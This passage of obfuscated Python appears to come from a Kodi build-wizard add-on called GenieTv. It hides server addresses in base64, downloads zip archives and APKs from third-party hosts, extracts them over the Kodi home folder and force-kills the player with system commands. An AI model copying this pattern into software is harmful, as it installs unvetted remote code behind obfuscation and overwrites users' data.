 O0Oo000ooO00 ( '[COLORgreen]SCOOBY STREAMS[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvdHZjYXRzLnBocA==' ) ) , 1016 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]SCOOBY SCRAPES[/COLOR]' , iiI1IiI , 1024 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 if 80 - 80: OoooooooOO - Ii11I * OOooOooo * ii11ii1ii / OOOo0 / Ii11I
 if 13 - 13: o0OOOoO0 * OO0O + i11iIiiIii * o0OOOoO0 - OO0O
def Ii1i1i1i1I1Ii ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]SEARCH MOVIES[/COLOR]' , iiI1IiI , 9001 , ii11iIi1I + 'MOVIESv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]SEARCH SERIES[/COLOR]' , iiI1IiI , 9002 , ii11iIi1I + 'TVSHOWSv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]SEARCH CARTOONS[/COLOR]' , '' , 10005 , ii11iIi1I + 'ORIGINCARTOON' , i1iiIII111ii , '' )
 if 25 - 25: OoOoOO00
 if 11 - 11: Oo
 if 74 - 74: I1IiI * OOooOOo + I1IiI . Ii11I * OoooooooOO % O0
 if 85 - 85: OO0O / O0
def iI1iIIIi1i ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]RADIO[/COLOR]' , iiI1IiI , 1013 , ii11iIi1I + 'radio.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CONCERTS' ) == 'true' :
  O0Oo000ooO00 ( '[COLORgreen]CONCERTS[/COLOR]' , ( i1111 ( 'aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2Z1bGxjb25jZXJ0cy8=' ) ) , 7050 , ii11iIi1I + 'concerts.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]MUSIC[/COLOR]' , iiI1IiI , 1030 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]MUSIC ARCHIVE[/COLOR]' , iiI1IiI + ( i1111 ( 'L3ZvZC91cmxzL211c2ljLnBocA==' ) ) , 1010 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]MUSIC SEARCH[/COLOR]' , iiI1IiI , 1111 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]KODIBLE AUDIO BOOKS[/COLOR]' , 'http://doremisa.com/audiobooks/' , 30000 , ii11iIi1I + 'kodible.png' , i1iiIII111ii , '' )
 if 89 - 89: iIii1I11I1II1
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 21 - 21: OOOO00ooo0Ooo % OOOO00ooo0Ooo
def iiI1 ( ) :
 oOooOOo00Oo0O ( )
 if 16 - 16: OoOoOO00 + ii - OoooooooOO
 O00OOOoOoo0O ( 'DELETE CACHE' , 'url' , 14 , ii11iIi1I + 'MAIN5.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'DELETE PACKAGES' , 'url' , 6 , ii11iIi1I + 'MAIN4.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'FORCE REFRESH' , 'url' , 10 , ii11iIi1I + 'MAIN3.png' , i1iiIII111ii , 'Force Refresh All Repos' )
 if 3 - 3: O0 / O00oo0OO0oOOO
 O00OOOoOoo0O ( 'CHECK MY IP' , 'url' , 12 , ii11iIi1I + 'MAIN2.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'ANDROID ONLY DELETE TEXTURE13.DB&THUBMNAIL FOLDER' , 'url' , 13 , ii11iIi1I + 'MAIN1.png' , i1iiIII111ii , 'Only Works On Android On Windows It Deletes Your Thumnails Folder But Does Not Delete The Textures13.db' )
 O0Oo000ooO00 ( '[COLORgreen]ADVANCED SETTINGS XML[/COLOR]' , iiI1IiI , 4 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]URL FIXES[/COLOR]' , iiI1IiI , 20 , ii11iIi1I + 'URLFIX.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 31 - 31: Ii11I + OOooOOo . OoooooooOO
 if 89 - 89: OoOoOO00 + i1IIi + OoOoOO00
def iI1Ii11111iIi ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]REPOS[/COLOR]' , ( i1111 ( 'aHR0cDovL21pcnJvcnMua29kaS50di9hZGRvbnMv' ) ) , 2030 , ii11iIi1I + 'repos.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]NEW[/COLOR]' , iiI1IiI , 22 , ii11iIi1I + 'NEW.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]IPTV[/COLOR]' , iiI1IiI , 23 , ii11iIi1I + 'IPTV.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]VIDEO[/COLOR]' , iiI1IiI , 24 , ii11iIi1I + 'VIDEO.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]SPORTS[/COLOR]' , iiI1IiI , 25 , ii11iIi1I + 'SPORTS.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]KIDS[/COLOR]' , iiI1IiI , 26 , ii11iIi1I + 'KIDS.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]MUSIC[/COLOR]' , iiI1IiI , 27 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]PROGRAMS[/COLOR]' , iiI1IiI , 28 , ii11iIi1I + 'PROGRAMS.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]XXX[/COLOR]' , 'URL' , 29 , ii11iIi1I + 'XXX.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 7 - 7: O0 % OOooOOo + ii11ii1ii * O00oo0OO0oOOO - O00oo0OO0oOOO
 if 42 - 42: I1IiI * I1IiI * o0OOOoO0 . OOOO00ooo0Ooo
def O0Oo0o000oO ( ) :
 oOooOOo00Oo0O ( )
 O00OOOoOoo0O ( 'CHECK ADVANCED XML' , iiI1IiI , 8 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'MUCKYS XML' , iiI1IiI + '/wizard/muckys.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '0CACHE XML' , iiI1IiI + '/wizard/0cache.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'MIKEY1234 XML' , iiI1IiI + '/wizard/mikey.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'TUXENS XML' , iiI1IiI + '/wizard/tuxens.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'P2P RECOMMENDED XML1' , iiI1IiI + '/wizard/p2p1.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'P2P RECOMMENDED XML2' , iiI1IiI + '/wizard/p2p2.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'DELETE XML' , iiI1IiI , 11 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 99 - 99: ii * OoOoOO00 * o0OOOoO0
def oOooO0 ( ) :
 oOooOOo00Oo0O ( )
 O00OOOoOoo0O ( '[COLORgreen]My Local Zip[/COLOR]' , I11 , 48 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]My Online Zip[/COLOR]' , i11 , 43 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 if 79 - 79: Ooo00oOo00o - iIii1I11I1II1 + OOooOooo - o0OOOoO0
def OoOiIIiii ( ) :
 oOooOOo00Oo0O ( )
 O00OOOoOoo0O ( 'INSTALL FTV GUIDE AND OTHER ADDONS REQUIRED' , iiI1IiI + '/wizard/customftv/ftvguide-addons.zip' , 5 , ii11iIi1I + 'FTV4.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'FTV GUIDE FIRST RUN SETTINGS' , iiI1IiI + '/wizard/customftv/settings.xml' , 17 , ii11iIi1I + 'FTV3.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'FTV GUIDE ADDONS2.INI UPDATE DAILY' , 'http://ren.byethost12.com/addons2.ini' , 16 , ii11iIi1I + 'FTV1.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'RESET FTV DATABASE' , 'url' , 18 , ii11iIi1I + 'FTV2.png' , i1iiIII111ii , '' )
 if 61 - 61: i1i1i11IIi . i1IIi / o0OOOoO0 % i11iIiiIii * O00oo0OO0oOOO
 if 31 - 31: Ii11I + O0
 if 87 - 87: OO0O
def IIIii ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]SKINS[/COLOR]' , iiI1IiI , 33 , ii11iIi1I + 'skinp.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]ARTWORK PACKS[/COLOR]' , iiI1IiI , 34 , ii11iIi1I + 'artp.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]CREATE UNIVERSAL PATHS[/COLOR]' , oooOOOOO , 35 , ii11iIi1I + 'GUI.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 83 - 83: i1i1i11IIi % OOooOOo % OOOo0 . iIii1I11I1II1 - i1i1i11IIi
def o00o ( url ) :
 Ii1IIiiIIi = iii ( Oo000o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 5 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 39 - 39: ii11ii1ii
def O0oOo00o0 ( ) :
 oOooOOo00Oo0O ( )
 O0Oo000ooO00 ( '[COLORgreen]GOTHAM SKINS[/COLOR]' , iiI1IiI , 36 , ii11iIi1I + 'GSKIN.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]HELIX SKINS[/COLOR]' , iiI1IiI , 37 , ii11iIi1I + 'HSKIN.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]ISENGAARD SKINS[/COLOR]' , oooOOOOO , 38 , ii11iIi1I + 'ISKIN.png' , i1iiIII111ii , '' )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 65 - 65: OoOoOO00 . OOOo0 % ii * Ooo00oOo00o
def iI11I ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + I1IIIiii1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 65 - 65: OOOO00ooo0Ooo / OoOoOO00 * OOooOooo . O00oo0OO0oOOO * ii % Ii11I
def O0oOOo0Oo ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + o000O000 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 19 - 19: iIii1I11I1II1
def Ii1IiI1i1ii ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + I1I1i1I ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 87 - 87: O0 / iIii1I11I1II1 * i1IIi
def IIi11IIiIii1 ( url ) :
 Ii1IIiiIIi = iii ( i1111 ( 'aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3MvN2ZrMjhndDlwb3QxMjJhL0JVSUxEUy50eHQ/ZGw9MA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 42 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 17 - 17: OOooOooo + ii . Ooo00oOo00o - Oo * i11iIiiIii
def iioOo0OoOOo0 ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + iII11I1Ii1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 40 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 92 - 92: OOOO00ooo0Ooo / OOOO00ooo0Ooo . ii11ii1ii
def ii1iIi1II ( url ) :
 Ii1IIiiIIi = iii ( iiI1IiI + IIIIi1I ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 5 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 31 - 31: OoOoOO00 - iIii1I11I1II1 - iIii1I11I1II1 % OOOO00ooo0Ooo
def iiiI1ii ( ) :
 OOOooo = OooO0OO ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vYXBrdG9vbC9hcGsucGhw' ) )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
 for iI1i11 , Ooo0oOooo0 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , iI1i11 , 2031 , Ooo0oOooo0 )
  if 24 - 24: I1IiI / OoooooooOO . OoOoOO00 . OOOo0 % O0 % OOooOooo
def IiIII1i1i ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( II11I , 'Download' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your App Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oo0oOO00oO = os . path . join ( OO0O00oOo , name + '.apk' )
 try :
  os . remove ( oo0oOO00oO )
 except :
  pass
 downloader . download ( url , oo0oOO00oO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Please press ok, exit kodi and go to your downloads folder to install your app[/COLOR]" , "[COLORblue]Tool Brought To You By Architects@Work[/COLOR]" )
 if 36 - 36: Ii11I
def O0o ( url ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/resources/downloads' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your fILM Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oo0oOO00oO = os . path . join ( OO0O00oOo , i1I1I + '.mp4' )
 try :
  os . remove ( oo0oOO00oO )
 except :
  pass
 downloader . download ( url , oo0oOO00oO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Please press ok, Your download With Be Avaiilable Via The My Downloads Button[/COLOR]" , "[COLORblue]Tool Brought To You By Architects@Work[/COLOR]" )
 if 42 - 42: OoOoOO00
 if 32 - 32: OOooOooo % ii11ii1ii - Ii11I * OOooOOo + OOOO00ooo0Ooo
def II1I ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your Art Pack Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oo0oOO00oO = os . path . join ( OO0O00oOo , name )
 try :
  os . remove ( oo0oOO00oO )
 except :
  pass
 downloader . download ( url , oo0oOO00oO , Oo0oO0ooo )
 OoOo000oOo0oo = xbmc . translatePath ( os . path . join ( oo00 ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Placing Your Art Please Wait" )
 print '======================================='
 print OoOo000oOo0oo
 print '======================================='
 extract . all ( oo0oOO00oO , OoOo000oOo0oo , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Once complete your artwork will be stored in your Media folder, Accessible via the Homefolder, Enjoy[/COLOR]" )
 if 65 - 65: I1IiI / Ooo00oOo00o % i1i1i11IIi
 if 45 - 45: I1IiI
def oOooOO ( url ) :
 Ii1IIiiIIi = iii ( i1111 ( 'aHR0cDovL2dlbmlldHYuYXJjaGl0ZWN0cy54MTBob3N0LmNvbS90ZXN0L3doLnR4dA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 5 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 try :
  Ii1IIiiIIi = iii ( I11IiIIII1i + oO0o0o0ooO0oO + o00oO0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
  for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
   O0Oo000ooO00 ( i1I1I , url , 5 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 except : pass
 ooOoOO0oo0O ( 'movies' , 'INFO' )
 if 5 - 5: iIii1I11I1II1
 if 72 - 72: ii . o0OOOoO0 / I1IiI + OOOO00ooo0Ooo % iIii1I11I1II1
def II1II1iIIi11 ( url ) :
 Ii1IIiiIIi = iii ( i1111 ( 'aHR0cDovL2dlbmlldHYuYXJjaGl0ZWN0cy54MTBob3N0LmNvbS90ZXN0L3doLnR4dA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
 for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 43 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 try :
  Ii1IIiiIIi = iii ( I11IiIIII1i + oO0o0o0ooO0oO + o00oO0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  oOooOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( Ii1IIiiIIi )
  for i1I1I , url , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II in oOooOOOoOo :
   O0Oo000ooO00 ( i1I1I , url , 43 , o0OOo0o0O0O , o0OO0o0oOOO0O , iiii111II )
 except : pass
 ooOoOO0oo0O ( 'movies' , 'INFO' )
 if 49 - 49: OoooooooOO * OOOO00ooo0Ooo - Oo . ii
 if 89 - 89: OO0O + OOooOooo * OO0O / OO0O
def i11i11 ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading Content" , '' , 'Please Wait' )
 oo0oOO00oO = os . path . join ( OO0O00oOo , name + '.zip' )
 try :
  os . remove ( oo0oOO00oO )
 except :
  pass
 downloader . download ( url , oo0oOO00oO , Oo0oO0ooo )
 OoOoO00O0 = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print OoOoO00O0
 print '======================================='
 extract . all ( oo0oOO00oO , OoOoO00O0 , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Press ok to finish install" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 I1I1I ( )
 if 51 - 51: iIii1I11I1II1 / I1IiI + Ii11I - OOOO00ooo0Ooo + O00oo0OO0oOOO
 if 29 - 29: OOooOOo % iIii1I11I1II1 . OoooooooOO % OoooooooOO % OoOoOO00 / O00oo0OO0oOOO
def oo0o0000Oo0 ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading " , '' , 'Please Wait' )
 oo0oOO00oO = os . path . join ( OO0O00oOo , 'plugin.program.GenieTv.install' + '.zip' )
 try :
  os . remove ( oo0oOO00oO )
 except :
  pass
 downloader . download ( url , oo0oOO00oO , Oo0oO0ooo )
 OoOoO00O0 = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print OoOoO00O0
 print '======================================='
 extract . all ( oo0oOO00oO , OoOoO00O0 , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Press ok to force close kodi, if unsuccessful using windows Please kill kodi via taskmanager" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 o0O00oOoo ( )
 if 63 - 63: O00oo0OO0oOOO * OOOO00ooo0Ooo * OOooOooo - ii - OOooOooo
def o0oo ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading " , '' , 'Please Wait' )
 oo0oOO00oO = os . path . join ( OO0O00oOo , 'plugin.program.GenieTv.install' + '.zip' )
 try :
  os . remove ( oo0oOO00oO )
 except :
  pass
 downloader . download ( url , oo0oOO00oO , Oo0oO0ooo )
 OoOoO00O0 = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print OoOoO00O0
 print '======================================='
 extract . all ( oo0oOO00oO , OoOoO00O0 , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Please Disconnect The Power From Your Device. DO NOT EXIT CLEANLY VIA SHUTDOWN" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 if 52 - 52: ii11ii1ii + ii11ii1ii . OoOoOO00
 if 34 - 34: OoooooooOO . O0 / ii * I1IiI - ii11ii1ii
def IiiiI ( name , url , description ) :
 OoOoO00O0 = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 oo0oOO00oO = os . path . join ( I11 )
 time . sleep ( 2 )
 Oo0oO0ooo . create ( "GenieTv" , "Restoring" , '' , 'Please Wait' )
 print '======================================='
 print OoOoO00O0
 print '======================================='
 extract . all ( oo0oOO00oO , OoOoO00O0 , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Please Disconnect The Power From Your Device. DO NOT EXIT CLEANLY VIA SHUTDOWN" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 if 42 - 42: i1IIi . OOOo0 / i1IIi + OOooOooo
 if 54 - 54: OO0O % Ii11I . o0OOOoO0 + ii - Ii11I * OOOo0
def o0O00oOoo ( ) :
 OOo00O = xbmcgui . Dialog ( ) . yesno ( 'Force Close Kodi' , 'You are about to close Kodi' , 'Would you like to continue?' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Close' )
 if OOo00O == 0 :
  return
 elif OOo00O == 1 :
  pass
 o0Ii1Iii111IiI1 = O00oOooo0 ( )
 print "Platform: " + str ( o0Ii1Iii111IiI1 )
 if o0Ii1Iii111IiI1 == 'osx' :
  print "############   try osx force close  #################"
  try : os . system ( 'killall -9 XBMC' )
  except : pass
  try : os . system ( 'killall -9 Kodi' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , '' )
 elif o0Ii1Iii111IiI1 == 'linux' :
  print "############   try linux force close  #################"
  try : os . system ( 'killall XBMC' )
  except : pass
  try : os . system ( 'killall Kodi' )
  except : pass
  try : os . system ( 'killall -9 xbmc.bin' )
  except : pass
  try : os . system ( 'killall -9 kodi.bin' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , '' )
 elif o0Ii1Iii111IiI1 == 'android' :
  print "############   try android force close  #################"
  try : os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "Your system has been detected as Android, you " , "[COLOR=yellow][B]MUST[/COLOR][/B] force close XBMC/Kodi. [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , "Pulling the power cable is the simplest method to force close." )
 elif o0Ii1Iii111IiI1 == 'windows' :
  print "############   try windows force close  #################"
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill XBMC.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill Kodi.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im Kodi.exe /f' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im XBMC.exe /f' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , "Use task manager and NOT ALT F4" )
 else :
  print "############   try atv force close  #################"
  try : os . system ( 'killall AppleTV' )
  except : pass
  print "############   try raspbmc force close  #################"
  try : os . system ( 'sudo initctl stop kodi' )
  except : pass
  try : os . system ( 'sudo initctl stop xbmc' )
